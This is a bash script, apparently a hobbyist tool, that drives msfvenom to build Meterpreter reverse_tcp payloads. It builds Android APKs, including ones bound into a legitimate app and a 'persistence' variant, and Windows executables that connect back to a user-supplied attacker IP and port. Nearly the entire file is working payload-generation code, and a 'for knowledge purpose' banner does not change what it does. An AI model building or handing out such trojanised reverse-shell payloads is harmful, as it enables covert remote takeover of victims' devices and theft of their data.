function ping_chk
{
ping=`ping -c 1 $i_p | grep bytes | wc -l`
if [ "$ping" -gt 1 ]
then
echo "host active"
printf "\n now you can proceed: "
else
echo "host inactive"
printf "\nthis will not work  try diffrent: "
read i_p
ping_chk
fi
}
printf "$(tput setaf 1)\n\n\t\t\tWritten By: Animesh Sinha\n\n\t\t\tGithub: animesh-h\n\n\n$(tput setab 7)"
sleep 1
echo -n "$(tput setaf 1)WARNING: THIS SCRIPT IS FOR KNOWLEDGE PURPOSE SO PLEASE DON'T USE IT ILLEGALY"
count=0
while [ $count -eq 0 ]
do
printf "$(tput setaf 1)\n\nEnter the type of os for which you want to create payload$(tput sgr 0)" 
sleep 0.5
printf "$(tput setaf 2)\n\n1.android\n2.windows\n3.mac os\n$(tput sgr 0)"
read n
printf "you entered option :- $n"
case $n in
1)
printf "$(tput setaf 3)\n\t\t<<<<---:ANDROID PAYLOAD SECTION:--->>>>\n$(tput sgr 0)"
sleep 0.5
printf "$(tput setaf 1)\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n$(tput sgr 0)"
read x
printf "you entered option :- $x"
case $x in
1)
        printf "\nAPK ONLY(NON-PERSISTENCE)\n"
        sleep 0.5
        printf "enter your ip: "
        read i_p
        echo "checking you ip active or inactive---"
        ping_chk
        printf "\nenter port: "
        read p
        printf "\nenter name of apk: "
        read nm
        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" -o $nm.apk
        ;;
2)
        printf "\nBINDED APK ONLY(NON-PERSISTENCE)\n"
        sleep 0.5
        printf "\nenter your ip: "
        read i_p
        echo "checking you ip active or inactive---"
        ping_chk
        printf "\nenter port: "
        read p
        printf "\nenter name of apk: "
        read nm
        printf "\nattach original apk for binding: "
        read f
        msfvenom -x $f -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" -o $nm.apk
        ;;
3)
        printf "\nPERSISTENCE BINDED APK\n"
        sleep 0.5
        printf "\nenter your ip: "
        read i_p
        echo "checking you ip active or inactive---"
        ping_chk
        printf "\nenter port: "
        read p
        printf "\nenter name of apk: "
        read nm
        printf "\nattach original apk for binding: "
        read f
        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
        ;;
        esac;;
2)
        printf "\n\t\t<<<<---:WINDOWS PAYLOAD SECTION :--->>>>\n\n"
        sleep 0.5
        printf "enter your ip: "
        read i_p
        echo "checking you ip active or inactive---"
        ping_chk
        printf "\nenter port: "
        read p
        printf "\nenter name of exe: "
        read nm
        msfvenom -p windows/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.exe
        ;;
3)
printf "\t\t\t<<<<<<< NOT YET READY >>>>>>>>\t\t\t\n"
;;
*)
printf "ENTERED WRONG OPTION"
sleep 0.3
printf "\n1.try again\n2.exit\n"
read op
printf "you entered option :- $op"
case $op in
1)
count=0
;;
2)
count=1
exit
;;
*)
count=1
exit
;;
esac
esac
done
